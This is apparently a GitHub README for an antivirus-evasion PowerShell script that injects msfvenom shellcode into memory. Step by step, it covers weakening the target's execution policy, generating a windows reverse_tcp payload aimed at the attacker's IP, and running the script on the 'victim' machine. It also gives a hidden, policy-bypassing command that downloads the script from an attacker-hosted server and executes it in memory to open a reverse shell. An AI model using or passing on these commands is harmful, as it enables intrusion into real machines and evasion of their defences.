# AntiVirus-bypass-PowerShell-In-Memory-Injection
Script made for bypassing antivirus using Powershell Injection method. Place your shellcode from msfvenom on line 15

[VirusTotal Scan 19/59](https://www.virustotal.com/gui/file/449a8fa6c25894a068b31a62399fda83093cdf430cad98ef579dd70d39df0907/detection)

<h3>Before running the script you have to set the ExecutionPolicy of the target machine to unrestricted:</h3>

```
powershell.exe

Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```

<h3>Example of the payload needed:</h3>

```
msfvenom -p windows/shell/reverse_tcp LHOST=IPkali LPORT=4444 -f powershell
```

<h3>Then we copy the payload like this:</h3>

![Captura de pantalla 2023-02-27 210003.jpg](https://raw.githubusercontent.com/sergiovks/AntiVirus-Bypass-PowerShell-In-Memory-Injection/main/screenshots/Captura%20de%20pantalla%202023-02-27%20210003.jpg)

<h3>And paste the payload to the 15th line of the .ps1 file:</h3>

![Captura de pantalla 2023-02-27 210359.jpg](https://raw.githubusercontent.com/sergiovks/AntiVirus-Bypass-PowerShell-In-Memory-Injection/main/screenshots/Captura%20de%20pantalla%202023-02-27%20210359.jpg)

<h3>Save the final PowerShell script and run it within the victim Windows machine.</h3>

<h3>We can combine this script with the use of the following command in order to download and inject the script, surely obtaining a reverse shell:</h3>

First of all you have to setup a python web server to host the payload, change the attacker IP and the PowerShell script name.

```
python3 -m http.server 80
```

Then you can use this command within the Windows target system:

```
$RegValue = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass -windowstyle hidden -nop iex (New-Object Net.WebClient).DownloadString('http://IPattacker/AVbypass.ps1'); Invoke-Function"
```
